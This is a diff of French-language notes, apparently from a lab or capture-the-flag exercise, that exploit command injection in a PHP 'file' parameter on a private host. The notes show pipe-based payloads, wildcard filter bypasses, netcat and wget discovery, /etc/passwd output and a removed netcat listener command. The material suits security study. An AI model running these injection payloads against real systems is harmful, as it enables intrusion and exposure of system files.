@@ -135,53 +135,12 @@ http://10.0.1.216/test.php?file=last.html|rev
 
 On peut aussi jouer avec les commandes :
 http://10.0.1.216/test.php?file=test.php|tac%26/bin/ech?%20test
-et dans la page on a bien le mot test qui s'affiche.
+et dans la page on a bien le mot test qui s'affiche sur la page.
 
 Allons plus loin on va voir si il y a netcat :
 http://10.0.1.216/test.php?file=test.php|tac%26whereis%20nc
 et oui il y a :
 nc: /bin/nc /bin/nc.openbsd /usr/share/man/man1/nc.1.gz 
-
-root@debian-10:~/gitrepo# curl http://10.0.1.216/test.php?file=test.php|/bin/nc -h
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100   293    0   293    0     0  19533      0 --:--:-- --:--:-- --:--:-- 20928
-[v1.10-41.1]
-connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
-listen for inbound:	nc -l -p port [-options] [hostname] [port]
-options:
-	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
-	-e filename		program to exec after connect [dangerous!!]
-	-b			allow broadcasts
-	-g gateway		source-routing hop point[s], up to 8
-	-G num			source-routing pointer: 4, 8, 12, ...
-	-h			this cruft
-	-i secs			delay interval for lines sent, ports scanned
-        -k                      set keepalive option on socket
-	-l			listen mode, for inbound connects
-	-n			numeric-only IP addresses, no DNS
-	-o file			hex dump of traffic
-	-p port			local port number
-	-r			randomize local and remote ports
-	-q secs			quit after EOF on stdin and delay of secs
-	-s addr			local source address
-	-T tos			set Type Of Service
-	-t			answer TELNET negotiation
-	-u			UDP mode
-	-v			verbose [use twice to be more verbose]
-	-w secs			timeout for connects and final net reads
-	-C			Send CRLF as line-ending
-	-z			zero-I/O mode [used for scanning]
-port numbers can be individual or ranges: lo-hi [inclusive];
-hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
-
-Ok je sais c'est pas dan sle bon sens mais :
-root@debian-10:~/gitrepo# curl http://10.0.1.216/test.php?file=test.php|/bin/nc -lvp 4444
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100   293    0   293    0     0  17235      0 --:--:-- --:--:-- --:--:-- 17235
-listening on [any] 4444 ...
-Donc on peut interagir avec curl et netcat...
 
 j'aimerais bien savoir comment ça s'affiche :
 on teste à nouveau :
@@ -238,10 +197,6 @@ _apt:x:106:65534::/nonexistent:/bin/false
 mysql:x:107:110:MySQL Server,,,:/nonexistent:/bin/false
 uuidd:x:108:113::/run/uuidd:/bin/false
 bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
-
-root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|tac;/?in/?s' | sed '/DOCTYPE/,/<\/html>/d' 
-/bin/ps
-/bin/ss
 
 root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|tac;/?in/?s+la+/' | sed '/DOCTYPE/,/<\/html>/d' 
 /bin/ps
@@ -310,8 +265,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Mais c'est quoi ce fichier ._pw_ ?
 est-ce que l'on peut avoir le contenu ?
-
-
 
 
 Voyons voir si il y a wget :
